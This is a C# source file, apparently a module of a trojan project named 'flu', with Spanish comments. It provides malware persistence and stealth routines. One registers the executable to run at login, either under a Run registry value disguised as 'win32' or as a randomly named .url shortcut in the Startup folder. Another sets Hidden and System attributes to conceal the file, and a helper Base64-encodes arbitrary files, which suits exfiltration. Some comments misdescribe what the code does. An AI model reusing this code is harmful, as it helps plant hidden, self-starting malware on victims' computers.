using System;
using Microsoft.Win32;
using System.IO;
using System.Reflection;

namespace flu
{
    // La clase File (Fichero) representa un fichero cualquiera, pudiendo realizar acciones sobre el
    class File
    {
        // Formas de ejecutar el programa al inicio
        public enum RunLocation {InRegistry, InStartup};

        // Ruta del fichero
        private string path;
        public const string rutaRegistroEjecutableFlu = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="filename">ruta del archivo</param>
        public File(string filename)
        {
            path = filename;
        }

        /// <summary>
        /// Devuelve true si existe la clave pasada por cabecera
        /// </summary>
        /// <param name="rKey">Clave del registro</param>
        /// <returns></returns>
        public bool existKey(string rKey)
        {
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(rutaRegistroEjecutableFlu, true);
            String[] claves = rk1.GetValueNames();
            foreach (String c in claves)
            {
                if (c.Equals(rKey))return true;
            }
            rk1.Close();
            return false;
        }

        /// <summary>
        /// Devuelve el valor de la clave pasada por cabecera
        /// </summary>
        /// <param name="rKey">Clave del registro</param>
        /// <returns></returns>
        public string getKeyValue(string rKey)
        {
            string value = string.Empty;
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(rutaRegistroEjecutableFlu, true);
            String[] claves = rk1.GetValueNames();
            foreach (String c in claves)
            {
                if (c.Equals(rKey))
                {
                    //Borramos entrada de Flu en el registro
                    try
                    {
                        value = rk1.GetValue(c).ToString();
                    }
                    catch { }
                    break;
                }
            }
            rk1.Close();
            return value;
        }

        /// <summary>
        /// Registrar el fichero para que se ejecute al inicio. Se puede registrar en el Registro o en la carpeta Inicio
        /// </summary>
        /// <param name="where"></param>
        public void Register(RunLocation where)
        {
            if (where == RunLocation.InRegistry)
            {
                RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(OS.RunKey, true);
                rk1.SetValue("win32", path);
                rk1.Close();
            }
            else
            {
                string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                // buscar forma mejor
                using (StreamWriter writer = new StreamWriter(startupDir + "\\" + Path.GetRandomFileName() + ".url"))
                {
                    string app = Assembly.GetExecutingAssembly().Location;
                    writer.WriteLine("[InternetShortcut]");
                    writer.WriteLine("URL=file:///" + path);
                    writer.WriteLine("IconIndex=0");
                    string icon = app.Replace('\\', '/');
                    writer.WriteLine("IconFile=" + icon);
                    writer.Flush();
                }
            }
        }

        /// <summary>
        /// Copia el fichero a otra ubicación
        /// </summary>
        /// <param name="newFilename">Ruta con la nueva ubicación</param>
        public void CopyTo(string newFilename)
        {
            //Application.ExecutablePath.ToString()
            try { System.IO.File.Copy(path, newFilename, true); } catch { };
        }

        /// <summary>
        /// Activa los atributos Oculto, Solo Lectura y De Sistema
        /// </summary>
        public void Protect()
        {
            try
            {
                FileInfo info = new FileInfo(path);
                info.Attributes = info.Attributes | FileAttributes.Hidden | FileAttributes.System;
            } catch { }
        }

        /// <summary>
        /// Convierte el contenido de un fichero a Base 64
        /// </summary>
        /// <param name="path">Ruta donde se encuentra el fichero</param>
        /// <returns>Devuelve un string con el contenido de un fichero convertido a Base 64</returns>
        public static string ToBase64(string path)
        {
            FileStream fs = new FileStream(@path, FileMode.Open, FileAccess.Read);
            byte[] filebytes = new byte[fs.Length];
            fs.Read(filebytes, 0, Convert.ToInt32(fs.Length));
            return Convert.ToBase64String(filebytes, Base64FormattingOptions.InsertLineBreaks);
        }
    }
}
